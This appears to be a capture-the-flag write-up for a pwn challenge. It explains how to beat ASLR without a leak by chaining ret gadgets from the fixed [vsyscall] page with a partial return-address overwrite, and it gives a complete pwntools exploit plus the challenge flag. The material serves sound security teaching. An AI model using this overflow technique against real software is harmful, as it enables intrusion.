# Virtual Insanity

Categories: pwn

Description:
>Dancing, Walking, Rearranging Furniture
>
>DISCLAIMER: This challenge doesn't require brute-forcing
> 
>author: TheRomanXpl0it (TRX) staff
>
>[dist.zip](resources/dist)

**Tags:** pwn, vsyscall, vdso

## Takeaways

* `[vsyscall]` and ROP wihout leak

## Challenge

```c
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>

void win() {
    printf("IMPOSSIBLE! GRAHHHHHHHHHH\n");
    puts(getenv("FLAG"));
}

int main() {
    char buf[0x20];
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    puts("You pathetic pwners are worthless without your precious leaks!!!");
    read(0, buf, 0x50);
}
```

```log
$ checksec --file=./chall
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
Full RELRO      No canary found   NX enabled    PIE enabled     No RPATH   No RUNPATH   42) Symbols       No    0               1               ./chall
```

## Solution

No canary and an obvious linear buffer overflow. Good!

However, the binary is PIE and ASLR is enabled.

The idea is to perform a partial overwrite of the return address to point to the `win` funciton since we have no leak to break ASLR. Let's check if this is possible:

```log
   0x555555555247 <main+109>       mov    eax, 0x0
   0x55555555524c <main+114>       leave
 → 0x55555555524d <main+115>       ret
   ↳  0x7ffff7c29d90 <__libc_start_call_main+128> mov    edi, eax
      0x7ffff7c29d92 <__libc_start_call_main+130> call   0x7ffff7c455f0 <__GI_exit>
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  telescope $rsp
0x00007fffffffd3e8│+0x0000: 0x00007ffff7c29d90  →  <__libc_start_call_main+128> mov edi, eax     ← $rsp
0x00007fffffffd3f0│+0x0008: 0x0000000000000000
0x00007fffffffd3f8│+0x0010: 0x00005555555551da  →  <main+0> endbr64
0x00007fffffffd400│+0x0018: 0x0000000100000000
0x00007fffffffd408│+0x0020: 0x00007fffffffd4f8  →  0x00007fffffffd947  →  "/home/nikos/ctfs/vm-tmp-shared/trx2025/virtual_ins[...]"
...
```

As we can see, a partial overwrite would lead us in the page where `__libc_start_call_main` lives, which is part of `libc.so`. At this point I searched around `__libc_start_call_main` for any gadgets that could lead us to `win`, taking into consideration the current state of the register file. However, I could not find such gadgets. One funny thing you can do with the partial overwrite to return to libc is that you can call `main` in an endless loop by overwriting with `0x89`:

```asm
__libc_start_call_main:
   0x00007ffff7c29d10 <+0>:     push   rax
   0x00007ffff7c29d11 <+1>:     pop    rax
   0x00007ffff7c29d12 <+2>:     sub    rsp,0x98
   0x00007ffff7c29d19 <+9>:     mov    QWORD PTR [rsp+0x8],rdi
   0x00007ffff7c29d1e <+14>:    lea    rdi,[rsp+0x20]
   0x00007ffff7c29d23 <+19>:    mov    DWORD PTR [rsp+0x14],esi
...
   0x00007ffff7c29d76 <+102>:   mov    rax,QWORD PTR [rip+0x1f023b]
   0x00007ffff7c29d7d <+109>:   mov    edi,DWORD PTR [rsp+0x14]
   0x00007ffff7c29d81 <+113>:   mov    rsi,QWORD PTR [rsp+0x18]
   0x00007ffff7c29d86 <+118>:   mov    rdx,QWORD PTR [rax]
   0x00007ffff7c29d89 <+121>:   mov    rax,QWORD PTR [rsp+0x8]      # can be abused for looping main()
   0x00007ffff7c29d8e <+126>:   call   rax
   0x00007ffff7c29d90 <+128>:   mov    edi,eax                      # oriignal return from main
   0x00007ffff7c29d92 <+130>:   call   0x7ffff7c455f0 <__GI_exit>
...
```

Howver, calling `main` in an endless loop and giving us a second chance does not lead us to our goal, the `win` function.

We also do not know the libc of the remote target (nor have any remote leaks to figure it out) in order to ROP to [`one_gadget`](https://github.com/david942j/one_gadget), which would *maybe* required brute-forcing a few ASLR bytes. So, this path is also not an option.

Besides the immediate return address of `main` stored at `0x00007fffffffd3e8` as shown above, another candidate point for partial overwrite is `0x10` bytes further down the stack, where the address of `main` is stored. But how can we survive the return of `main` and use ROP gadgets to reach the 2nd overwrite if we have no leaks? We will abuse `[vsyscall]`.

`[vsyscall]` is always mapped at at the constant address `0xffffffffff600000` on x86 \[[ref](https://github.com/torvalds/linux/blob/16f73eb02d7e1765ccab3d2018e0bd98eb93d973/Documentation/x86/x86_64/mm.txt)\] and contains some simple gadgets:

```asm
// https://elixir.bootlin.com/linux/v6.12/source/arch/x86/entry/vsyscall/vsyscall_emu_64.S

__PAGE_ALIGNED_DATA
	.globl __vsyscall_page
	.balign PAGE_SIZE, 0xcc
	.type __vsyscall_page, @object
__vsyscall_page:
	mov $__NR_gettimeofday, %rax
	syscall
	ret
	int3

	.balign 1024, 0xcc
	mov $__NR_time, %rax
	syscall
	ret
	int3

	.balign 1024, 0xcc
	mov $__NR_getcpu, %rax
	syscall
	ret
	int3

	.balign 4096, 0xcc

	.size __vsyscall_page, 4096
```
As we can see, the `ret` instructions in `[vsyscall]` can be used as noop gadgets until we reach the partial overwrite of the `main` pointer.

In modern kernel versions, `[vsyscall]` is mapped as execute-only ([`XONLY`](https://lore.kernel.org/kernel-hardening/d17655777c21bc09a7af1bbcf74e6f2b69a51152.1561610354.git.luto@kernel.org/)) in userspace, so the page is not readble from userspace even if we want to simply inspect it.

`vsyscalls` are really legacy at this point and were replaced by `vdso`, which servers the same purpose (make some syscalls faster by implementing them in userspace), but is affected by ASLR in contrast to `vsyscall`. `vdso` is also a userspace library while `vsyscall` is really kernel pages mapped to userspace:

```bash
# vdso is located at different address on every run, affected by ASLR
# vsyscall is located at a fixed address:
$ cat /proc/self/maps | grep -Ee 'vdso|vsyscall'
    7fff0e3ba000     7fff0e3bc000 r-xp                   [vdso]
ffffffffff600000 ffffffffff601000 --xp                   [vsyscall]
$ cat /proc/self/maps | grep -Ee 'vdso|vsyscall'
    7ffc794cd000     7ffc794cf000 r-xp                   [vdso]
ffffffffff600000 ffffffffff601000 --xp                   [vsyscall]
$ cat /proc/self/maps | grep -Ee 'vdso|vsyscall'
    7ffe82cd2000    7ffe82cd4000  r-xp                   [vdso]
ffffffffff600000 ffffffffff601000 --xp                   [vsyscall]

$ ldd /bin/cat | grep vdso
        linux-vdso.so.1 (0x00007ffd521f1000)
```

`vsyscall` resolution is out of scope, but it is self-explained in [vsyscall_64.c](https://elixir.bootlin.com/linux/v6.12/source/arch/x86/entry/vsyscall/vsyscall_64.c). Modern kernel configurations emulate `vsyscalls` via page faults and are no longer resolved in userspace for security reasons. Anyway. With these information, we are now able to write our exploit:

```bash
$ objdump -d ./chall | grep -Ee 'main|win'
00000000000011a9 <win>:
00000000000011da <main>:
```

```python
from pwn import *
context.binary = elfexe = ELF('./chall')
io = remote('virtual.ctf.theromanxpl0.it', 7011)

io.recvline()
payload  = b'A'*0x20
payload += b'B'*0x8 # rbp

# vsyscall acts as a noop gadget
payload += p64(0xffffffffff600000) # pc
payload += p64(0xffffffffff600000)
payload += b"\xa9" # partial overwrite to win

io.send(payload)

io.interactive()
io.close()
```

and we get the flag!

`TRX{1_h0p3_y0u_d1dn7_bru73f0rc3_dc85efe0}`
